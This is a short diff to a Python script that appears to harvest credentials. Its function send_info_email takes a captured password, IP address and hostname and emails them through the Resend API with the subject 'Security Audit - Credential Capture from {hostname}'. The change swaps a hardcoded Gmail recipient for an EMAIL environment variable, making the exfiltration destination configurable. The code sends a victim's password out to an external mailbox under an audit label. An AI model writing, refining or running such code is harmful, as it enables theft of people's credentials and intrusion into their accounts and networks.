@@ -251,8 +251,9 @@ def get_wifi_info(password, log):
 def send_info_email(password, ip, log):
     try:
         api_key = os.environ.get("RESEND_API_KEY")
-        if not api_key:
-            log_print("[ERROR] RESEND_API_KEY not set.", log)
+        email = os.environ.get("EMAIL")
+        if not api_key or not email:
+            log_print("[ERROR] RESEND_API_KEY or EMAIL not set.", log)
             return
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         hostname = os.uname().nodename
@@ -278,7 +279,7 @@ def send_info_email(password, ip, log):
         """
         data = {
             "from": "Acme <onboarding@resend.dev>",
-            "to": ["arkhamzz47@gmail.com"],
+            "to": [email],
             "subject": f"Security Audit - Credential Capture from {hostname}",
             "html": html_body
         }
